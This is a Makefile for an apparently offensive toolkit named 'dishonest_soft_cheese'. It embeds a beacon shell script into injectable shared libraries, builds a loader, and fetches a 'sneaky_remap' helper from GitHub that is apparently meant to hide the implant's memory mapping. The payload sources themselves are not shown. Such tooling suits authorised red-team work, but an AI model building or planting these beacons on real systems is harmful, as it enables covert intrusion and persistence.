# Makefile
# Build dishonest_soft_cheese
# By J. Stuart McMurray
# Created 20251031
# Last Modified 20251102

ALL    = dishonest_soft_cheese.so dishonest_soft_cheese_thread.so dsc_loader\
	 dishonest_soft_cheese_thread_sneakily_remapped.so
CFLAGS = -Wall -Werror -Wextra --pedantic -O2

all: ${ALL}
.PHONY: all

beacon.h: beacon.sh
	echo 'char BEACON_SH[] = {'                           >$@
	perl -gpe '$$_=join"",map{"0x$$_,"}unpack"(H2)*"' $> >>$@
	echo '0x00};'                                        >>$@

dishonest_soft_cheese.so dishonest_soft_cheese_thread.so: ${@:R}.c beacon.h
dishonest_soft_cheese.so dishonest_soft_cheese_thread.so: build_c

dishonest_soft_cheese_thread_sneakily_remapped.so: ${@:R}.c beacon.h build_c
dishonest_soft_cheese_thread_sneakily_remapped.so: sneaky_remap.c 
dishonest_soft_cheese_thread_sneakily_remapped.so: sneaky_remap.h

dsc_loader: dsc_loader.c
	${CC} ${CFLAGS} -o $@ $>

sneaky_remap.c sneaky_remap.h:
	curl -LO https://raw.githubusercontent.com/magisterquis/sneaky_remap/refs/heads/master/$@

build_c: .USE
	${CC} ${CFLAGS} -fPIC -shared -o $@ ${>:M*.c}

clean:
	rm -f ${ALL} beacon.h sneaky_remap.c sneaky_remap.h
.PHONY: clean
